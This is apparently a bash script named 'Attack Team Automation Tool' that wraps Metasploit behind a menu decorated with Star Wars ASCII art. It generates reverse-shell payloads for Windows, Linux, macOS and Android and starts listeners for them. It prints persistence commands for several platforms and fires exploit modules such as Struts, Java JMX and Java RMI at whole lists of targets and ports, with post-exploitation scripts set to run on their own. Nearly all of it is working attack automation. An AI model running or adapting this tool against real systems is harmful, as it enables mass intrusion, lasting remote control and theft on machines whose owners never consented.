#!/bin/bash
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to start your ATAT"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;
secs=$(date '+%S');

if ps ax | grep -v grep | grep postgresql > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service postgresql start
fi 
SERVICE1=service;
if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE1 service running"
else
    echo "$SERVICE1 is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Desktop/temp 
clear
clear
echo -e "\E[1;33m==========================================================="
echo -e "\E[1;33m============== \e[97mMetasploit services started \E[1;33m================"
echo -e "\E[1;33m:::::::::::::\e[97mScripts saved to ~/Desktop/temp/\E[1;33m::::::::::::::"
echo -e "\E[1;33m::::::::::::::::\e[97mPayloads saved to ~/ATAT/\E[1;33m::::::::::::::::::"
echo -e "\E[1;33m==========================================================="
read -p "Press [Enter] key to Continue..."
clear
echo -e "\E[1;33m======================== \e[97mAttack Team Automation Tool \E[1;33m========================="
if [ 0 -le $secs ] && [ $secs -le 14 ];
then
cat << "EOF"
     _________________________________
    |:::::::::::::;;::::::::::::::::::|
    |:::::::::::'~||~~~``:::::::::::::| 
    |::::::::'   .':     o`:::::::::::|          By |||3N1GmA|||
    |:::::::' oo | |o  o    ::::::::::| 
    |::::::: 8  .'.'    8 o  :::::::::|
    |::::::: 8  | |     8    :::::::::|
    |::::::: _._| |_,...8    :::::::::|
    |::::::'~--.   .--. `.   `::::::::|
    |:::::'     =8     ~  \ o ::::::::| "I Find Your Lack of Faith Disturbing"
    |::::'       8._ 88.   \ o::::::::|
    |:::'   __. ,.ooo~~.    \ o`::::::|
    |:::   . -. 88`78o/:     \  `:::::|        
    |::'     /. o o \ ::      \88`::::|       
    |:;     o|| 8 8 |d.        `8 `:::|       
    |:.       - ^ ^ -'           `-`::|       
    |::.                          .:::|       
    |:::::.....           ::'     ``::|      
    |::::::::-' -        88          `|       
    |:::::-'.          -       ::     |       
    |:-~. . .                   :     |      
    | .. .   ..:   o:8      88o       |       
    |. .     :::   8:P     d888. . .  |       
    |.   .   :88   88      888'  . .  |       
    |   o8  d88P . 88   ' d88P   ..   |       
    |  88P  888   d8P   ' 888         |      
    |   8  d88P.'d:8  .- dP~ o8       | 
    |      888   888    d~ o888       |
    |_________________________________|                          
EOF
elif [ 15 -le $secs ] && [ $secs -le 30 ];
then
cat << "EOF"
                  .?MMMMMMM8$@m-(".-.
                 (MMMMMMMMMMMMMMe(%e9ODA#%eRwC1%%?!-";
                MMMMMMMMMMMMMMMM*%JOMMMMMMMMMMM8M0DC?*%4?".
              .9MMMMMMMMMMMMMMMwe2#MMMMMMRC41%J#M&DC1D8&wM@*M&
             'MMMMMMMMMMMMM0@R9eemMMM#0##M9m**i(%???*i(|1#MRD2
             MMMMMMMMMMM@$449w2C!J%?C%"";"eCw$"|m==||;-`M.
           .MMMMMMMMMDO*i(((||(ii?*1?*%i"=(?mR  1%?(("%!
           mM@MM92e!';"i"?ii(ei;""""";";-(??.
          %MA!!?;"%"="i""mi'-1"""|""=;"""`&(
          .(4?"(=';;"""*9w|.-||(i%%|;`';;.;'
           *eJ;`%("((|i99C|.=|C=!1e;"w......     By ||3N1GmA||
           0m*"1|;"!*(&9me'.-1       M .`..R
           29*"M      -&C(..";       "i .'i%
           #C!%m      MRD"...J        M.;(|.
           @81!9     i&&2;...J=       1;!eiM
          '99*C8     9!"=''`.(%       $A&2"92
          'w=-(?     M%=`.`.e(        AMM*%!.
          CM("A     'OJ%.'.!e         #MMO1w%
          CMA"M.   .MMM%-;'*.         (MMMR0M
         %MMO!wD4 -MMM@%"|"M.        1MMMM8&DJ
         8O1DMMM0w"(!%(*1%"M*       .MM%?AOMMM.
        'R#MMMMMM!24mO91!("=J.      *MMwMMMMMMM
     =C@M0MM@Ae2MMMMMMMA1%"%J4|    %MMMMMMM0@&M?"
   (*M@MMR&&&2C#@#R&&&OC("'.&1='***MMMM#A8&AA1(=(
  ******%(MMMMM@M#OwmJw4A&&i.="2MMM8OwRwCCC1JmD&&$MD   Imperial AT-AT 
EOF
elif [ 31 -le $secs ] && [ $secs -le 45 ];
then
cat << "EOF"
                 ________
            _,.-Y  |  |  Y-._
        .-~"   ||  |  |  |   "-.
        I" ""=="|" !""! "|"[]""|     _____
        L__  [] |..------|:   _[----I" .-{"-.
       I___|  ..| l______|l_ [__L]_[I_/r(=}=-P
      [L______L_[________]______j~  '-=c_]/=-^
       \_I_j.--.\==I|I==_/.--L_]
         [_((==)[`-----"](==)j
            I--I"~~"""~~"I--I
            |[]|         |[]|        By |||3N1GmA|||
            l__j         l__j
            |!!|         |!!|
            |..|         |..|
            ([])         ([])
            ]--[         ]--[
            [_L]         [_L] 
           /|..|\       /|..|\
          `=}--{='     `=}--{='
         .-^--r-^-.   .-^--r-^-.             Imperial AT-AT
EOF
elif [ 46 -le $secs ] && [ $secs -le 57 ];
then
cat << "EOF"
               ._,.
           "..-..pf.
          -L   ..#'
        .+_L  ."]#
        ,'j' .+.j`                 -'.__..,.,p.
       _~ #..<..0.                 .J-.``..._f.
      .7..#_.. _f.                .....-..,`4'
      ;` ,#j.  T'      ..         ..J....,'.j`
     .` .."^.,-0.,,,,yMMMMM,.    ,-.J...+`.j@
    .'.`...' .yMMMMM0M@^=`""g.. .'..J..".'.jH
    j' .'1`  q'^)@@#"^".`"='BNg_...,]_)'...0-
   .T ...I. j"    .'..+,_.'3#MMM0MggCBf....F.
   j/.+'.{..+       `^~'-^~~""""'"""?'"``'1`
   .... .y.}                  `.._-:`_...jf
   g-.  .Lg'                 ..,..'-....,'.
  .'.   .Y^                  .....',].._f    By ||3N1GmA||
  ......-f.                 .-,,.,.-:--&`
                            .`...'..`_J`
                            .~......'#'
                            '..,,.,_]`    
                            .L..`..``. 
EOF
else
cat << "EOF"
     .    .     .            +         .         .                 .  .
      .                 .                   .               .
              .    ,,o         .                  __.o+.
    .            od8^                  .      oo888888P^b           .
       .       ,".o'      .     .             `b^'""`b -`b   .
             ,'.'o'             .   .          t. = -`b -`t.    .
            ; d o' .        ___          _.--.. 8  -  `b  =`b
        .  dooo8<       .o:':__;o.     ,;;o88%%8bb - = `b  =`b.    .
    .     |^88^88=. .,x88/::/ | \\`;;;;;;d%%%%%88%88888/%x88888
          :-88=88%%L8`%`|::|_>-<_||%;;%;8%%=;:::=%8;;\%%%%\8888
      .   |=88 88%%|HHHH|::| >-< |||;%;;8%%=;:::=%8;;;%%%%+|]88        .
          | 88-88%%LL.%.%b::Y_|_Y/%|;;;;`%8%%oo88%:o%.;;;;+|]88  .
          Yx88o88^^'"`^^%8boooood..-\H_Hd%P%%88%P^%%^'\;;;/%%88
         . `"\^\          ~"""""'      d%P """^" ;   = `+' - P
   .        `.`.b   .                :<%%>  .   :  -   d' - P      . .
              .`.b     .        .    `788      ,'-  = d' =.'
       .       ``.b.                           :..-  :'  P
            .   `q.>b         .               `^^^:::::,'       .
                  ""^^               .                     .
  .                                           .               .       .
    .         .          .                 .        +         .
EOF
fi 
tput sgr0                                       # 
echo -e "\e[31m_________________________[ \e[97mChoose Your Destiny \e[31m]"
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;33m===\e[97m[1] \e[90mPayload              \e[97m [Create MSFVenom Payload]  \E[1;33m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;33m:::\e[97m[2] \e[32mListen               \e[97m [Start a Listener]   \E[1;33m"
tput sgr0
echo -e "\E[1;33m===\e[97m[3] \e[34mExploit              \e[97m [Drop into msfconsole]\E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[4] \e[95mPersistence          \e[97m [Create a Persistence script] \E[1;33m"
tput sgr0
echo -e "\E[1;33m===\e[97m[5] \e[31mArmitage             \e[97m [Launch the Armitage GUI]  \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[6] \e[90mMulti-Target Exploit \e[97m [Fire 1 Exploit at Many Targets]   \E[1;33m"
tput sgr0                               # Reset attributes.
echo -e "\E[1;33m===\e[97m[7] \e[32mMulti-Port Exploit   \e[97m [Fire 1 Exploit at 1 Target on many Ports]  \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[8] \e[34mMulti-Port Auxiliary \e[97m [Run 1 Auxiliary Module Against Many Ports]  \E[1;33m"
tput sgr0
echo -e "\E[1;33m===\e[97m[9] \e[95mMulti-Target Struts \e[97m  [Fire 1 Struts Exploit at Many Targets]   \E[1;33m"
tput sgr0
echo -e "\E[1;33m:::\e[97m[10]\e[31mMulti-Target Java JMX \e[97m[Fire 1 JMX Exploit at Many Targets]   \E[1;33m"
tput sgr0
echo -e "\E[1;33m===\e[97m[11]\e[90mMulti-Target Java RMI \e[97m[Fire 1 RMI Exploit at Many Targets]   \E[1;33m"
tput sgr0
echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\e[97m~~~~~~~~~~~~~~~~~~ \e[31mProps to rand0m1ze for the concept!\e[97m~~~~~~~~~~~~~~~~~~\e[31m"
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;33m::::: \e[97mChoose Your Weapon\E[1;33m:::::"

PS3='Enter your choice 8=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Custom" "All The Payloads" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
            echo -e "\E[1;33m::::: \e[97mshell.exe saved to ~/ATAT/\E[1;33m:::::"
            ;;
        "Linux")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
            echo -e "\E[1;33m::::: \e[97mshell.elf saved to ~/ATAT/\E[1;33m:::::"
            ;;
        "Mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
            echo -e "\E[1;33m::::: \e[97mshell.macho saved to ~/ATAT/\E[1;33m:::::"
            ;;
        "Android")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
            echo -e "\E[1;33m::::: \e[97mshell.apk saved to ~/ATAT/\E[1;33m:::::"
            ;;  
        "Custom")
cat << "EOF"
<TYPE>:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .dll]

 Rather than putting <DOMAIN/IP>, you can input an interface and ATAT will detect that IP address. 
EOF
            read -p 'Set DOMAIN/IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set TYPE: ' usertype; read -p 'Select CMD/MSF: ' usershell; read -p 'Set BIND/REVERSE: ' userbindrev; read -p 'Set STAGED/STAGELESS: ' userstage; read -p 'Select TCP/HTTP/HTTPS/FIND_PORT: ' userprotocol; read -p 'Select BATCH/LOOP (optional): ' usermode
            /usr/bin/msfpc $usertype $userhost $userport $usershell $userbindrev $userstage $userprotocol $usermode verbose
            echo -e "\E[1;33m::::: \e[97mPayload & RC File Saved to ~/ATAT/\E[1;33m:::::"
            ;;
        "All The Payloads")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport
            /usr/bin/msfpc verbose loop $userhost $userport
            echo -e "\E[1;33m::::: \e[97mPayloads & RC Files Saved to ~/ATAT/\E[1;33m:::::"
            ;;
        "List_All")
            xterm -e msvenom -l &
            ;;   
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[1;33m::::: \e[97mCreate a Listener\E[1;33m:::::"

PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
        read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
            touch ~/Desktop/temp/meterpreter.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter.rc
            echo set LHOST $userhost >> ~/Desktop/temp/meterpreter.rc
            echo set LPORT $userport >> ~/Desktop/temp/meterpreter.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
            cat ~/Desktop/temp/meterpreter.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
            ;;
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

 "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "\E[1;33m::::: \e[97mStarting Metasploit \E[1;33m:::::"
  msfconsole
  use exploit/multi/handler  

;;


  "4" | "4" )
  # 
  echo -e "\E[1;33m::::: \e[97mPersistence Generator \E[1;33m:::::"
 PS3='Enter your choice 5=QUIT: '
 options=("Windows" "Linux" "Mac" "Android" "Quit")
 select opt in "${options[@]}"
 do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            echo -e "\E[1;33m::::: \e[97mrun persistence -U -X 30 -p $userport -r $uservar\E[1;33m:::::"
            ;;
        "Linux")
            echo -e "\E[1;33m::::: \e[97mGet creative here :)\E[1;33m:::::"
            ;;
        "Mac")
            echo 'Using directory /Applications/Utilities/'
            read -p 'Enter payload file name :example *shell.macho: ' uservar; 
            echo -e "\E[1;33m::::: \e[97mdefaults write /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/$uservar”;}’\E[1;33m:::::"
            ;;
        "Android")
            touch ~/Desktop/temp/android.sh
            echo \#\!/bin/bash >> ~/Desktop/temp/android.sh
            echo while : >> ~/Desktop/temp/android.sh
            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/Desktop/temp/android.sh
            echo sleep 20 >> ~/Desktop/temp/android.sh
            echo done >> ~/Desktop/temp/android.sh
            cat ~/Desktop/temp/android.sh
            echo -e "\E[1;33m::::: \e[97mandroid.sh saved to ~/Desktop/temp. Upload to / on device\E[1;33m:::::" 
            ;;  
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

  "5" | "5" )
  # 
  echo -e "\E[1;33m::::: \e[97mArmitage Launcher \E[1;33m:::::"
  echo "armitage should be in /opt/armitage"
  echo -e "\E[1;33m::::: \e[97mLaunching...\E[1;33m:::::"
  xterm -e sudo java -jar /opt/armitage/armitage.jar & 

;;

 "6" | "6" )
         
 echo -e "\E[1;33m::::: \e[97mExploit All The Things!!\E[1;33m:::::"
 echo -e "\E[1;33m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;33m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set RHOST $IP;\
	set RPORT $targetport;\
	set PAYLOAD $userpayload;\
	set DisablePayloadHandler true;\
	set AutoRunScript multi_console_command -rc postex.rc;\
	run;\
	exit"
	done
            echo -e "\E[1;33m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions!\E[1;33m:::::"
            ;;
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;

 "7" | "7" )
         
echo -e "\E[1;33m::::: \e[97mExploit All The Ports!!\E[1;33m:::::"
echo -e "\E[1;33m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;33m:::::"

PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set RHOST: ' usertarget;
	inputfile=~/ATAT/MSF_target_ports.txt

	for PORT in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set RHOST $usertarget;\
	set RPORT $PORT;\
	set PAYLOAD $userpayload;\
	set DisablePayloadHandler true;\
	set AutoRunScript multi_console_command -rc postex.rc;\
	run;\
	exit"
	done
            echo -e "\E[1;33m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions!\E[1;33m:::::"
            ;;
        
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;
  
   "8" | "8" )
          
echo -e "\E[1;33m::::: \e[97mScan All The Things!!\E[1;33m:::::"

PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set MODULE_PATH: ' usermodule; read -p 'Set RHOSTS: ' usertarget;
	inputfile=~/ATAT/MSF_AUX_target_ports.txt

	for PORT in $(cat $inputfile)
	do
	msfconsole -x "use $usermodule;\
	set RHOSTS $usertarget;\
	set RPORT $PORT;\
	run;\
	exit"
	done
            echo -e "\E[1;33m::::: \e[97mAll Targets Have Been Scanned\E[1;33m:::::"
            ;;
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
   
;;
 
 "9" | "9" )
         
 echo -e "\E[1;33m::::: \e[97mExploit All The Struts!!\E[1;33m:::::"
 echo -e "\E[1;33m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;33m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set TARGETURI: ' useruri;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	set LHOST $userhost;\
	set SRVPORT $srvport;\
	set RPORT $userport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set TARGETURI $useruri;\
	set DisablePayloadHandler true;\
	set AutoRunScript multi_console_command -rc postex.rc;\
	run;\
	exit"
	done
            echo -e "\E[1;33m::::: \e[97mAll Struts Targets Have Been Tested! Check Your Listener for Sessions!\E[1;33m:::::"
            ;;
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;
  
 "10" | "10" )
         
 echo -e "\E[1;33m::::: \e[97mExploit All The Java JMX!!\E[1;33m:::::"
 echo -e "\E[1;33m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;33m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set JMXRMI: ' userjmxrmi;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use exploit/multi/misc/java_jmx_server;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set JMXRMI $userjmxrmi;\
	set DisablePayloadHandler true;\
	set AutoRunScript multi_console_command -rc postex.rc;\
	run;\
	exit"
	done
            echo -e "\E[1;33m::::: \e[97mAll Java JMX Targets Have Been Tested! Check Your Listener for Sessions!\E[1;33m:::::"
            ;;
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;  

 "11" | "11" )
         
 echo -e "\E[1;33m::::: \e[97mExploit All The Java RMI!!\E[1;33m:::::"
 echo -e "\E[1;33m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;33m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set HTTPDELAY: (default 10) ' userdelay;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use exploit/multi/misc/java_rmi_server;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set HTTPDELAY $userdelay;\
	set DisablePayloadHandler true;\
	set AutoRunScript multi_console_command -rc postex.rc;\
	run;\
	exit"
	done
            echo -e "\E[1;33m::::: \e[97mAll Java RMI Targets Have Been Tested! Check Your Listener for Sessions!\E[1;33m:::::"
            ;;
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;  
   
esac

tput sgr0                               # Reset colors to "normal."

echo

exit 0
